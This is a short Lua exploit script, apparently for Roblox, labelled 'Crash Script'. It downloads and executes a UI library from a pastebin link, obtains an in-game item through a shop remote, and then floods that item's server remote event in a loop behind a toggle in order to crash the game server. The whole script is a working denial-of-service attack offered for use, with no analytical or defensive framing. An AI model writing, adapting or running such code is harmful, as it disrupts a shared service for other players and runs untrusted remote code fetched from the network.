local omg = 10 -- 10 should work

local rs = game:GetService("RunService")
local char = game:GetService("Players").LocalPlayer.Character
local back = game:GetService("Players").LocalPlayer.Backpack
local library = loadstring(game:HttpGet("https://pastebin.com/raw/eKwyeQa0", true))()
local tab1 = library:CreateTab("Crash Script", true)
getgenv().crash = false
workspace.svcl_com.ShopExtra:FireServer("BRAINSAW")
local toggle = library:MakeToggle(tab1,"Crash Toggle",false,function(toggle)
    local b = toggle.Text
    if b == "ON" then
        crash = true
    else
        crash = false
    end
end)
local remote = back:WaitForChild("BRAINSAW").Pew
while wait() do
    if crash == true then
        local a = char.Head.Position
        for i=1,omg,1 do
            remote:FireServer(a)
        end
    end
end